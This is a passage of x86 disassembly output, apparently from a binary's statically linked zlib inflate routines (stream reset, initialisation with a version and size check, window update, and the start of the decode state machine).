  405681:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405688:	00 
  405689:	8b 44 bd 00          	mov    0x0(%ebp,%edi,4),%eax
  40568d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405694:	89 44 24 04          	mov    %eax,0x4(%esp)
  405698:	e8 e3 fd ff ff       	call   0x405480
  40569d:	85 c0                	test   %eax,%eax
  40569f:	89 04 bb             	mov    %eax,(%ebx,%edi,4)
  4056a2:	75 d0                	jne    0x405674
  4056a4:	31 f6                	xor    %esi,%esi
  4056a6:	85 ff                	test   %edi,%edi
  4056a8:	78 18                	js     0x4056c2
  4056aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4056b0:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  4056b3:	83 c6 01             	add    $0x1,%esi
  4056b6:	89 04 24             	mov    %eax,(%esp)
  4056b9:	e8 da 51 00 00       	call   0x40a898
  4056be:	39 fe                	cmp    %edi,%esi
  4056c0:	7e ee                	jle    0x4056b0
  4056c2:	89 1c 24             	mov    %ebx,(%esp)
  4056c5:	e8 ce 51 00 00       	call   0x40a898
  4056ca:	83 c4 2c             	add    $0x2c,%esp
  4056cd:	31 c0                	xor    %eax,%eax
  4056cf:	5b                   	pop    %ebx
  4056d0:	5e                   	pop    %esi
  4056d1:	5f                   	pop    %edi
  4056d2:	5d                   	pop    %ebp
  4056d3:	c3                   	ret
  4056d4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4056d8:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  4056df:	00 
  4056e0:	83 c4 2c             	add    $0x2c,%esp
  4056e3:	89 d8                	mov    %ebx,%eax
  4056e5:	5b                   	pop    %ebx
  4056e6:	5e                   	pop    %esi
  4056e7:	5f                   	pop    %edi
  4056e8:	5d                   	pop    %ebp
  4056e9:	c3                   	ret
  4056ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4056f0:	83 ec 1c             	sub    $0x1c,%esp
  4056f3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4056f7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4056fe:	00 
  4056ff:	89 44 24 04          	mov    %eax,0x4(%esp)
  405703:	8b 44 24 20          	mov    0x20(%esp),%eax
  405707:	89 04 24             	mov    %eax,(%esp)
  40570a:	e8 31 ff ff ff       	call   0x405640
  40570f:	83 c4 1c             	add    $0x1c,%esp
  405712:	c3                   	ret
  405713:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405719:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405720:	83 ec 1c             	sub    $0x1c,%esp
  405723:	8b 44 24 24          	mov    0x24(%esp),%eax
  405727:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  40572e:	00 
  40572f:	89 44 24 04          	mov    %eax,0x4(%esp)
  405733:	8b 44 24 20          	mov    0x20(%esp),%eax
  405737:	89 04 24             	mov    %eax,(%esp)
  40573a:	e8 01 ff ff ff       	call   0x405640
  40573f:	83 c4 1c             	add    $0x1c,%esp
  405742:	c3                   	ret
  405743:	90                   	nop
  405744:	90                   	nop
  405745:	90                   	nop
  405746:	90                   	nop
  405747:	90                   	nop
  405748:	90                   	nop
  405749:	90                   	nop
  40574a:	90                   	nop
  40574b:	90                   	nop
  40574c:	90                   	nop
  40574d:	90                   	nop
  40574e:	90                   	nop
  40574f:	90                   	nop
  405750:	b8 c0 d4 40 00       	mov    $0x40d4c0,%eax
  405755:	c3                   	ret
  405756:	8d 76 00             	lea    0x0(%esi),%esi
  405759:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405760:	b8 55 00 00 00       	mov    $0x55,%eax
  405765:	c3                   	ret
  405766:	8d 76 00             	lea    0x0(%esi),%esi
  405769:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405770:	b8 02 00 00 00       	mov    $0x2,%eax
  405775:	2b 44 24 04          	sub    0x4(%esp),%eax
  405779:	8b 04 85 40 d5 40 00 	mov    0x40d540(,%eax,4),%eax
  405780:	c3                   	ret
  405781:	eb 0d                	jmp    0x405790
  405783:	90                   	nop
  405784:	90                   	nop
  405785:	90                   	nop
  405786:	90                   	nop
  405787:	90                   	nop
  405788:	90                   	nop
  405789:	90                   	nop
  40578a:	90                   	nop
  40578b:	90                   	nop
  40578c:	90                   	nop
  40578d:	90                   	nop
  40578e:	90                   	nop
  40578f:	90                   	nop
  405790:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405794:	0f af 44 24 08       	imul   0x8(%esp),%eax
  405799:	89 44 24 04          	mov    %eax,0x4(%esp)
  40579d:	e9 ae 50 00 00       	jmp    0x40a850
  4057a2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4057a9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4057b0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4057b4:	89 44 24 04          	mov    %eax,0x4(%esp)
  4057b8:	e9 db 50 00 00       	jmp    0x40a898
  4057bd:	90                   	nop
  4057be:	90                   	nop
  4057bf:	90                   	nop
  4057c0:	55                   	push   %ebp
  4057c1:	57                   	push   %edi
  4057c2:	89 d5                	mov    %edx,%ebp
  4057c4:	56                   	push   %esi
  4057c5:	53                   	push   %ebx
  4057c6:	83 ec 08             	sub    $0x8,%esp
  4057c9:	8b 30                	mov    (%eax),%esi
  4057cb:	89 44 24 04          	mov    %eax,0x4(%esp)
  4057cf:	83 fe 03             	cmp    $0x3,%esi
  4057d2:	0f 96 c2             	setbe  %dl
  4057d5:	85 c9                	test   %ecx,%ecx
  4057d7:	0f 95 c0             	setne  %al
  4057da:	31 db                	xor    %ebx,%ebx
  4057dc:	20 c2                	and    %al,%dl
  4057de:	88 54 24 03          	mov    %dl,0x3(%esp)
  4057e2:	74 4c                	je     0x405830
  4057e4:	bf 04 00 00 00       	mov    $0x4,%edi
  4057e9:	eb 1c                	jmp    0x405807
  4057eb:	90                   	nop
  4057ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4057f0:	89 f8                	mov    %edi,%eax
  4057f2:	29 f0                	sub    %esi,%eax
  4057f4:	83 f8 03             	cmp    $0x3,%eax
  4057f7:	89 c6                	mov    %eax,%esi
  4057f9:	0f 96 c0             	setbe  %al
  4057fc:	83 c3 01             	add    $0x1,%ebx
  4057ff:	84 c0                	test   %al,%al
  405801:	74 2d                	je     0x405830
  405803:	39 d9                	cmp    %ebx,%ecx
  405805:	76 29                	jbe    0x405830
  405807:	0f b6 54 1d 00       	movzbl 0x0(%ebp,%ebx,1),%edx
  40580c:	83 fe 02             	cmp    $0x2,%esi
  40580f:	19 c0                	sbb    %eax,%eax
  405811:	f7 d0                	not    %eax
  405813:	38 c2                	cmp    %al,%dl
  405815:	74 29                	je     0x405840
  405817:	84 d2                	test   %dl,%dl
  405819:	74 d5                	je     0x4057f0
  40581b:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  405820:	31 f6                	xor    %esi,%esi
  405822:	83 c3 01             	add    $0x1,%ebx
  405825:	84 c0                	test   %al,%al
  405827:	75 da                	jne    0x405803
  405829:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405830:	8b 44 24 04          	mov    0x4(%esp),%eax
  405834:	89 30                	mov    %esi,(%eax)
  405836:	83 c4 08             	add    $0x8,%esp
  405839:	89 d8                	mov    %ebx,%eax
  40583b:	5b                   	pop    %ebx
  40583c:	5e                   	pop    %esi
  40583d:	5f                   	pop    %edi
  40583e:	5d                   	pop    %ebp
  40583f:	c3                   	ret
  405840:	83 c6 01             	add    $0x1,%esi
  405843:	83 fe 03             	cmp    $0x3,%esi
  405846:	0f 96 c0             	setbe  %al
  405849:	eb b1                	jmp    0x4057fc
  40584b:	90                   	nop
  40584c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405850:	55                   	push   %ebp
  405851:	57                   	push   %edi
  405852:	89 d5                	mov    %edx,%ebp
  405854:	56                   	push   %esi
  405855:	53                   	push   %ebx
  405856:	89 cf                	mov    %ecx,%edi
  405858:	83 ec 1c             	sub    $0x1c,%esp
  40585b:	8b 70 1c             	mov    0x1c(%eax),%esi
  40585e:	8b 56 34             	mov    0x34(%esi),%edx
  405861:	85 d2                	test   %edx,%edx
  405863:	0f 84 e7 00 00 00    	je     0x405950
  405869:	8b 5e 28             	mov    0x28(%esi),%ebx
  40586c:	85 db                	test   %ebx,%ebx
  40586e:	74 51                	je     0x4058c1
  405870:	39 df                	cmp    %ebx,%edi
  405872:	73 69                	jae    0x4058dd
  405874:	8b 46 30             	mov    0x30(%esi),%eax
  405877:	29 c3                	sub    %eax,%ebx
  405879:	39 fb                	cmp    %edi,%ebx
  40587b:	0f 47 df             	cmova  %edi,%ebx
  40587e:	01 d0                	add    %edx,%eax
  405880:	89 ea                	mov    %ebp,%edx
  405882:	29 fa                	sub    %edi,%edx
  405884:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  405888:	89 04 24             	mov    %eax,(%esp)
  40588b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40588f:	e8 c4 4f 00 00       	call   0x40a858
  405894:	29 df                	sub    %ebx,%edi
  405896:	0f 85 86 00 00 00    	jne    0x405922
  40589c:	8b 46 30             	mov    0x30(%esi),%eax
  40589f:	8b 4e 28             	mov    0x28(%esi),%ecx
  4058a2:	01 d8                	add    %ebx,%eax
  4058a4:	39 c8                	cmp    %ecx,%eax
  4058a6:	89 46 30             	mov    %eax,0x30(%esi)
  4058a9:	74 65                	je     0x405910
  4058ab:	8b 56 2c             	mov    0x2c(%esi),%edx
  4058ae:	31 c0                	xor    %eax,%eax
  4058b0:	39 d1                	cmp    %edx,%ecx
  4058b2:	76 05                	jbe    0x4058b9
  4058b4:	01 d3                	add    %edx,%ebx
  4058b6:	89 5e 2c             	mov    %ebx,0x2c(%esi)
  4058b9:	83 c4 1c             	add    $0x1c,%esp
  4058bc:	5b                   	pop    %ebx
  4058bd:	5e                   	pop    %esi
  4058be:	5f                   	pop    %edi
  4058bf:	5d                   	pop    %ebp
  4058c0:	c3                   	ret
  4058c1:	8b 4e 24             	mov    0x24(%esi),%ecx
  4058c4:	b3 01                	mov    $0x1,%bl
  4058c6:	c7 46 30 00 00 00 00 	movl   $0x0,0x30(%esi)
  4058cd:	c7 46 2c 00 00 00 00 	movl   $0x0,0x2c(%esi)
  4058d4:	d3 e3                	shl    %cl,%ebx
  4058d6:	39 df                	cmp    %ebx,%edi
  4058d8:	89 5e 28             	mov    %ebx,0x28(%esi)
  4058db:	72 97                	jb     0x405874
  4058dd:	29 dd                	sub    %ebx,%ebp
  4058df:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4058e3:	89 14 24             	mov    %edx,(%esp)
  4058e6:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4058ea:	e8 69 4f 00 00       	call   0x40a858
  4058ef:	8b 46 28             	mov    0x28(%esi),%eax
  4058f2:	c7 46 30 00 00 00 00 	movl   $0x0,0x30(%esi)
  4058f9:	89 46 2c             	mov    %eax,0x2c(%esi)
  4058fc:	83 c4 1c             	add    $0x1c,%esp
  4058ff:	31 c0                	xor    %eax,%eax
  405901:	5b                   	pop    %ebx
  405902:	5e                   	pop    %esi
  405903:	5f                   	pop    %edi
  405904:	5d                   	pop    %ebp
  405905:	c3                   	ret
  405906:	8d 76 00             	lea    0x0(%esi),%esi
  405909:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405910:	8b 56 2c             	mov    0x2c(%esi),%edx
  405913:	31 c0                	xor    %eax,%eax
  405915:	c7 46 30 00 00 00 00 	movl   $0x0,0x30(%esi)
  40591c:	39 d1                	cmp    %edx,%ecx
  40591e:	77 94                	ja     0x4058b4
  405920:	eb 97                	jmp    0x4058b9
  405922:	8b 46 34             	mov    0x34(%esi),%eax
  405925:	29 fd                	sub    %edi,%ebp
  405927:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40592b:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40592f:	89 04 24             	mov    %eax,(%esp)
  405932:	e8 21 4f 00 00       	call   0x40a858
  405937:	8b 46 28             	mov    0x28(%esi),%eax
  40593a:	89 7e 30             	mov    %edi,0x30(%esi)
  40593d:	89 46 2c             	mov    %eax,0x2c(%esi)
  405940:	83 c4 1c             	add    $0x1c,%esp
  405943:	31 c0                	xor    %eax,%eax
  405945:	5b                   	pop    %ebx
  405946:	5e                   	pop    %esi
  405947:	5f                   	pop    %edi
  405948:	5d                   	pop    %ebp
  405949:	c3                   	ret
  40594a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405950:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  405957:	00 
  405958:	8b 4e 24             	mov    0x24(%esi),%ecx
  40595b:	b2 01                	mov    $0x1,%dl
  40595d:	d3 e2                	shl    %cl,%edx
  40595f:	89 54 24 04          	mov    %edx,0x4(%esp)
  405963:	8b 50 28             	mov    0x28(%eax),%edx
  405966:	89 14 24             	mov    %edx,(%esp)
  405969:	ff 50 20             	call   *0x20(%eax)
  40596c:	85 c0                	test   %eax,%eax
  40596e:	89 46 34             	mov    %eax,0x34(%esi)
  405971:	74 07                	je     0x40597a
  405973:	89 c2                	mov    %eax,%edx
  405975:	e9 ef fe ff ff       	jmp    0x405869
  40597a:	b8 01 00 00 00       	mov    $0x1,%eax
  40597f:	e9 35 ff ff ff       	jmp    0x4058b9
  405984:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40598a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  405990:	8b 54 24 04          	mov    0x4(%esp),%edx
  405994:	85 d2                	test   %edx,%edx
  405996:	0f 84 86 00 00 00    	je     0x405a22
  40599c:	8b 42 1c             	mov    0x1c(%edx),%eax
  40599f:	85 c0                	test   %eax,%eax
  4059a1:	74 7f                	je     0x405a22
  4059a3:	8b 48 08             	mov    0x8(%eax),%ecx
  4059a6:	c7 40 1c 00 00 00 00 	movl   $0x0,0x1c(%eax)
  4059ad:	c7 42 14 00 00 00 00 	movl   $0x0,0x14(%edx)
  4059b4:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  4059bb:	c7 42 18 00 00 00 00 	movl   $0x0,0x18(%edx)
  4059c2:	85 c9                	test   %ecx,%ecx
  4059c4:	74 06                	je     0x4059cc
  4059c6:	83 e1 01             	and    $0x1,%ecx
  4059c9:	89 4a 30             	mov    %ecx,0x30(%edx)
  4059cc:	8d 90 30 05 00 00    	lea    0x530(%eax),%edx
  4059d2:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4059d8:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  4059df:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  4059e6:	c7 40 14 00 80 00 00 	movl   $0x8000,0x14(%eax)
  4059ed:	c7 40 20 00 00 00 00 	movl   $0x0,0x20(%eax)
  4059f4:	c7 40 38 00 00 00 00 	movl   $0x0,0x38(%eax)
  4059fb:	c7 40 3c 00 00 00 00 	movl   $0x0,0x3c(%eax)
  405a02:	89 50 6c             	mov    %edx,0x6c(%eax)
  405a05:	89 50 50             	mov    %edx,0x50(%eax)
  405a08:	89 50 4c             	mov    %edx,0x4c(%eax)
  405a0b:	c7 80 c0 1b 00 00 01 	movl   $0x1,0x1bc0(%eax)
  405a12:	00 00 00 
  405a15:	c7 80 c4 1b 00 00 ff 	movl   $0xffffffff,0x1bc4(%eax)
  405a1c:	ff ff ff 
  405a1f:	31 c0                	xor    %eax,%eax
  405a21:	c3                   	ret
  405a22:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405a27:	c3                   	ret
  405a28:	90                   	nop
  405a29:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405a30:	8b 54 24 04          	mov    0x4(%esp),%edx
  405a34:	85 d2                	test   %edx,%edx
  405a36:	74 28                	je     0x405a60
  405a38:	8b 42 1c             	mov    0x1c(%edx),%eax
  405a3b:	85 c0                	test   %eax,%eax
  405a3d:	74 21                	je     0x405a60
  405a3f:	c7 40 28 00 00 00 00 	movl   $0x0,0x28(%eax)
  405a46:	c7 40 2c 00 00 00 00 	movl   $0x0,0x2c(%eax)
  405a4d:	c7 40 30 00 00 00 00 	movl   $0x0,0x30(%eax)
  405a54:	e9 37 ff ff ff       	jmp    0x405990
  405a59:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405a60:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405a65:	c3                   	ret
  405a66:	8d 76 00             	lea    0x0(%esi),%esi
  405a69:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405a70:	55                   	push   %ebp
  405a71:	57                   	push   %edi
  405a72:	56                   	push   %esi
  405a73:	53                   	push   %ebx
  405a74:	83 ec 1c             	sub    $0x1c,%esp
  405a77:	8b 7c 24 30          	mov    0x30(%esp),%edi
  405a7b:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  405a7f:	85 ff                	test   %edi,%edi
  405a81:	74 6d                	je     0x405af0
  405a83:	8b 77 1c             	mov    0x1c(%edi),%esi
  405a86:	85 f6                	test   %esi,%esi
  405a88:	74 66                	je     0x405af0
  405a8a:	85 db                	test   %ebx,%ebx
  405a8c:	78 55                	js     0x405ae3
  405a8e:	89 dd                	mov    %ebx,%ebp
  405a90:	89 d8                	mov    %ebx,%eax
  405a92:	c1 fd 04             	sar    $0x4,%ebp
  405a95:	83 e0 0f             	and    $0xf,%eax
  405a98:	83 c5 01             	add    $0x1,%ebp
  405a9b:	83 fb 2f             	cmp    $0x2f,%ebx
  405a9e:	0f 4e d8             	cmovle %eax,%ebx
  405aa1:	8d 43 f8             	lea    -0x8(%ebx),%eax
  405aa4:	83 f8 07             	cmp    $0x7,%eax
  405aa7:	76 04                	jbe    0x405aad
  405aa9:	85 db                	test   %ebx,%ebx
  405aab:	75 43                	jne    0x405af0
  405aad:	8b 46 34             	mov    0x34(%esi),%eax
  405ab0:	85 c0                	test   %eax,%eax
  405ab2:	74 19                	je     0x405acd
  405ab4:	3b 5e 24             	cmp    0x24(%esi),%ebx
  405ab7:	74 14                	je     0x405acd
  405ab9:	89 44 24 04          	mov    %eax,0x4(%esp)
  405abd:	8b 47 28             	mov    0x28(%edi),%eax
  405ac0:	89 04 24             	mov    %eax,(%esp)
  405ac3:	ff 57 24             	call   *0x24(%edi)
  405ac6:	c7 46 34 00 00 00 00 	movl   $0x0,0x34(%esi)
  405acd:	89 6e 08             	mov    %ebp,0x8(%esi)
  405ad0:	89 5e 24             	mov    %ebx,0x24(%esi)
  405ad3:	89 7c 24 30          	mov    %edi,0x30(%esp)
  405ad7:	83 c4 1c             	add    $0x1c,%esp
  405ada:	5b                   	pop    %ebx
  405adb:	5e                   	pop    %esi
  405adc:	5f                   	pop    %edi
  405add:	5d                   	pop    %ebp
  405ade:	e9 4d ff ff ff       	jmp    0x405a30
  405ae3:	f7 db                	neg    %ebx
  405ae5:	31 ed                	xor    %ebp,%ebp
  405ae7:	eb b8                	jmp    0x405aa1
  405ae9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405af0:	83 c4 1c             	add    $0x1c,%esp
  405af3:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405af8:	5b                   	pop    %ebx
  405af9:	5e                   	pop    %esi
  405afa:	5f                   	pop    %edi
  405afb:	5d                   	pop    %ebp
  405afc:	c3                   	ret
  405afd:	8d 76 00             	lea    0x0(%esi),%esi
  405b00:	57                   	push   %edi
  405b01:	56                   	push   %esi
  405b02:	53                   	push   %ebx
  405b03:	83 ec 10             	sub    $0x10,%esp
  405b06:	8b 44 24 28          	mov    0x28(%esp),%eax
  405b0a:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  405b0e:	85 c0                	test   %eax,%eax
  405b10:	0f 84 da 00 00 00    	je     0x405bf0
  405b16:	80 38 31             	cmpb   $0x31,(%eax)
  405b19:	0f 85 d1 00 00 00    	jne    0x405bf0
  405b1f:	83 7c 24 2c 38       	cmpl   $0x38,0x2c(%esp)
  405b24:	0f 85 c6 00 00 00    	jne    0x405bf0
  405b2a:	85 db                	test   %ebx,%ebx
  405b2c:	0f 84 d5 00 00 00    	je     0x405c07
  405b32:	8b 43 20             	mov    0x20(%ebx),%eax
  405b35:	c7 43 18 00 00 00 00 	movl   $0x0,0x18(%ebx)
  405b3c:	85 c0                	test   %eax,%eax
  405b3e:	0f 84 8c 00 00 00    	je     0x405bd0
  405b44:	8b 53 28             	mov    0x28(%ebx),%edx
  405b47:	8b 4b 24             	mov    0x24(%ebx),%ecx
  405b4a:	85 c9                	test   %ecx,%ecx
  405b4c:	74 72                	je     0x405bc0
  405b4e:	c7 44 24 08 cc 1b 00 	movl   $0x1bcc,0x8(%esp)
  405b55:	00 
  405b56:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  405b5d:	00 
  405b5e:	89 14 24             	mov    %edx,(%esp)
  405b61:	ff d0                	call   *%eax
  405b63:	85 c0                	test   %eax,%eax
  405b65:	89 c6                	mov    %eax,%esi
  405b67:	0f 84 93 00 00 00    	je     0x405c00
  405b6d:	89 43 1c             	mov    %eax,0x1c(%ebx)
  405b70:	c7 40 34 00 00 00 00 	movl   $0x0,0x34(%eax)
  405b77:	8b 44 24 24          	mov    0x24(%esp),%eax
  405b7b:	89 1c 24             	mov    %ebx,(%esp)
  405b7e:	89 44 24 04          	mov    %eax,0x4(%esp)
  405b82:	e8 e9 fe ff ff       	call   0x405a70
  405b87:	89 c7                	mov    %eax,%edi
  405b89:	31 c0                	xor    %eax,%eax
  405b8b:	85 ff                	test   %edi,%edi
  405b8d:	75 11                	jne    0x405ba0
  405b8f:	83 c4 10             	add    $0x10,%esp
  405b92:	5b                   	pop    %ebx
  405b93:	5e                   	pop    %esi
  405b94:	5f                   	pop    %edi
  405b95:	c3                   	ret
  405b96:	8d 76 00             	lea    0x0(%esi),%esi
  405b99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405ba0:	89 74 24 04          	mov    %esi,0x4(%esp)
  405ba4:	8b 43 28             	mov    0x28(%ebx),%eax
  405ba7:	89 04 24             	mov    %eax,(%esp)
  405baa:	ff 53 24             	call   *0x24(%ebx)
  405bad:	c7 43 1c 00 00 00 00 	movl   $0x0,0x1c(%ebx)
  405bb4:	83 c4 10             	add    $0x10,%esp
  405bb7:	89 f8                	mov    %edi,%eax
  405bb9:	5b                   	pop    %ebx
  405bba:	5e                   	pop    %esi
  405bbb:	5f                   	pop    %edi
  405bbc:	c3                   	ret
  405bbd:	8d 76 00             	lea    0x0(%esi),%esi
  405bc0:	c7 43 24 b0 57 40 00 	movl   $0x4057b0,0x24(%ebx)
  405bc7:	eb 85                	jmp    0x405b4e
  405bc9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405bd0:	c7 43 20 90 57 40 00 	movl   $0x405790,0x20(%ebx)
  405bd7:	c7 43 28 00 00 00 00 	movl   $0x0,0x28(%ebx)
  405bde:	31 d2                	xor    %edx,%edx
  405be0:	b8 90 57 40 00       	mov    $0x405790,%eax
  405be5:	e9 5d ff ff ff       	jmp    0x405b47
  405bea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405bf0:	83 c4 10             	add    $0x10,%esp
  405bf3:	b8 fa ff ff ff       	mov    $0xfffffffa,%eax
  405bf8:	5b                   	pop    %ebx
  405bf9:	5e                   	pop    %esi
  405bfa:	5f                   	pop    %edi
  405bfb:	c3                   	ret
  405bfc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405c00:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  405c05:	eb 88                	jmp    0x405b8f
  405c07:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405c0c:	eb 81                	jmp    0x405b8f
  405c0e:	66 90                	xchg   %ax,%ax
  405c10:	83 ec 1c             	sub    $0x1c,%esp
  405c13:	8b 44 24 28          	mov    0x28(%esp),%eax
  405c17:	c7 44 24 04 0f 00 00 	movl   $0xf,0x4(%esp)
  405c1e:	00 
  405c1f:	89 44 24 0c          	mov    %eax,0xc(%esp)
  405c23:	8b 44 24 24          	mov    0x24(%esp),%eax
  405c27:	89 44 24 08          	mov    %eax,0x8(%esp)
  405c2b:	8b 44 24 20          	mov    0x20(%esp),%eax
  405c2f:	89 04 24             	mov    %eax,(%esp)
  405c32:	e8 c9 fe ff ff       	call   0x405b00
  405c37:	83 c4 1c             	add    $0x1c,%esp
  405c3a:	c3                   	ret
  405c3b:	90                   	nop
  405c3c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405c40:	56                   	push   %esi
  405c41:	53                   	push   %ebx
  405c42:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405c46:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405c4a:	85 c0                	test   %eax,%eax
  405c4c:	74 55                	je     0x405ca3
  405c4e:	8b 50 1c             	mov    0x1c(%eax),%edx
  405c51:	85 d2                	test   %edx,%edx
  405c53:	74 4e                	je     0x405ca3
  405c55:	85 c9                	test   %ecx,%ecx
  405c57:	78 37                	js     0x405c90
  405c59:	83 f9 10             	cmp    $0x10,%ecx
  405c5c:	7f 45                	jg     0x405ca3
  405c5e:	8b 72 3c             	mov    0x3c(%edx),%esi
  405c61:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
  405c64:	83 fb 20             	cmp    $0x20,%ebx
  405c67:	77 3a                	ja     0x405ca3
  405c69:	b8 01 00 00 00       	mov    $0x1,%eax
  405c6e:	89 5a 3c             	mov    %ebx,0x3c(%edx)
  405c71:	d3 e0                	shl    %cl,%eax
  405c73:	89 f1                	mov    %esi,%ecx
  405c75:	83 e8 01             	sub    $0x1,%eax
  405c78:	23 44 24 14          	and    0x14(%esp),%eax
  405c7c:	d3 e0                	shl    %cl,%eax
  405c7e:	01 42 38             	add    %eax,0x38(%edx)
  405c81:	31 c0                	xor    %eax,%eax
  405c83:	5b                   	pop    %ebx
  405c84:	5e                   	pop    %esi
  405c85:	c3                   	ret
  405c86:	8d 76 00             	lea    0x0(%esi),%esi
  405c89:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405c90:	c7 42 38 00 00 00 00 	movl   $0x0,0x38(%edx)
  405c97:	c7 42 3c 00 00 00 00 	movl   $0x0,0x3c(%edx)
  405c9e:	31 c0                	xor    %eax,%eax
  405ca0:	5b                   	pop    %ebx
  405ca1:	5e                   	pop    %esi
  405ca2:	c3                   	ret
  405ca3:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405ca8:	eb d9                	jmp    0x405c83
  405caa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405cb0:	55                   	push   %ebp
  405cb1:	57                   	push   %edi
  405cb2:	56                   	push   %esi
  405cb3:	53                   	push   %ebx
  405cb4:	83 ec 7c             	sub    $0x7c,%esp
  405cb7:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  405cbe:	85 c0                	test   %eax,%eax
  405cc0:	0f 84 1e 14 00 00    	je     0x4070e4
  405cc6:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  405ccd:	8b 78 1c             	mov    0x1c(%eax),%edi
  405cd0:	85 ff                	test   %edi,%edi
  405cd2:	0f 84 0c 14 00 00    	je     0x4070e4
  405cd8:	8b 40 0c             	mov    0xc(%eax),%eax
  405cdb:	85 c0                	test   %eax,%eax
  405cdd:	89 44 24 30          	mov    %eax,0x30(%esp)
  405ce1:	0f 84 fd 13 00 00    	je     0x4070e4
  405ce7:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  405cee:	8b 18                	mov    (%eax),%ebx
  405cf0:	85 db                	test   %ebx,%ebx
  405cf2:	0f 84 a8 13 00 00    	je     0x4070a0
  405cf8:	8b 40 04             	mov    0x4(%eax),%eax
  405cfb:	89 44 24 34          	mov    %eax,0x34(%esp)
  405cff:	8b 07                	mov    (%edi),%eax
  405d01:	83 f8 0b             	cmp    $0xb,%eax
  405d04:	0f 84 96 01 00 00    	je     0x405ea0
  405d0a:	8b b4 24 90 00 00 00 	mov    0x90(%esp),%esi
  405d11:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  405d15:	89 7c 24 24          	mov    %edi,0x24(%esp)
  405d19:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  405d20:	00 
  405d21:	8b 56 10             	mov    0x10(%esi),%edx
  405d24:	8b 77 38             	mov    0x38(%edi),%esi
  405d27:	89 54 24 28          	mov    %edx,0x28(%esp)
  405d2b:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  405d2f:	8d 97 30 05 00 00    	lea    0x530(%edi),%edx
  405d35:	89 f1                	mov    %esi,%ecx
  405d37:	8b 77 3c             	mov    0x3c(%edi),%esi
  405d3a:	89 54 24 50          	mov    %edx,0x50(%esp)
  405d3e:	8d 97 f0 02 00 00    	lea    0x2f0(%edi),%edx
  405d44:	89 ef                	mov    %ebp,%edi
  405d46:	89 dd                	mov    %ebx,%ebp
  405d48:	89 54 24 4c          	mov    %edx,0x4c(%esp)
  405d4c:	89 f3                	mov    %esi,%ebx
  405d4e:	89 ce                	mov    %ecx,%esi
  405d50:	83 f8 1e             	cmp    $0x1e,%eax
  405d53:	0f 87 8b 13 00 00    	ja     0x4070e4
  405d59:	ff 24 85 50 d7 40 00 	jmp    *0x40d750(,%eax,4)
  405d60:	83 fb 1f             	cmp    $0x1f,%ebx
